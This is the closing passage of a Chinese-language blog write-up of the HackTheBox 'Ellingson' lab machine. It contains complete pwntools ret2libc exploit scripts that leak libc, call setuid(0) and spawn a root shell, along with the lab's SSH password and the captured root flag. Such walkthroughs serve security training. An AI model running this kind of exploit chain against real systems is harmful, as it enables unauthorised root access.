class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n</code></pre>\n<h3>GetShell</h3>\n<p>得到需要的地址后，我们可以进行获取<code>Shell</code>了</p>\n<p>再此之前，我们还需要一个<code>ret</code>来实现堆栈平衡</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson ROPgadget --binary garbage --only <span class=\"hljs-string\">\"ret\"</span>    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n</code></pre>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n\nsystem_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_addr:{hex(system_addr)}\"</span>)\n\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\n\nret_addr = 0x0000000000401016\n\npayload2 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n</code></pre>\n<p>然后我们运行，但是权限只是 <code>margo</code>的权限</p>\n<pre><code class=\"hljs language-bash\">$ $ <span class=\"hljs-built_in\">id</span>\nuid=1002(margo) gid=1002(margo) <span class=\"hljs-built_in\">groups</span>=1002(margo)\n</code></pre>\n<h3>GetRootShell</h3>\n<p>我们还需要进行将<code>shell</code>权限提升，可以使用<code>setuid</code></p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n\nsystem_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_addr:{hex(system_addr)}\"</span>)\n\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym[<span class=\"hljs-string\">'setuid'</span>]\n\npayload2 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n</code></pre>\n<p>运行获得 <code>RootShell</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n<span class=\"hljs-comment\"># $ id</span>\nuid=0(root) gid=1002(margo) <span class=\"hljs-built_in\">groups</span>=1002(margo)\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># $ cat /root/root.txt</span>\nd87f7aac2d13c429b8d30e11be174dd6\n</code></pre>\n<h2>总结</h2>\n<p>爽。</p>\n<p>打到缓冲区溢出无从下手，花了一天多时间恶补<code>ROP</code> ，然后一命通关</p>\n<p>太爽了。</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/vibePls-4x.gif\" alt=\"image.gif\"></p>","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","updated":"2025-06-15","tags":["HackTheBox","Linux","PWN","ret2libc","Crack"],"categories":"靶机","comments":true,"description":"Machine Ellingson https://app.hackthebox.com/machines/Ellingson | Linux | Hard Recon 访问HTTP 内容告诉我们他们被Ellingson病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被ban (目录扫描也不行..."}},"__N_SSG":true}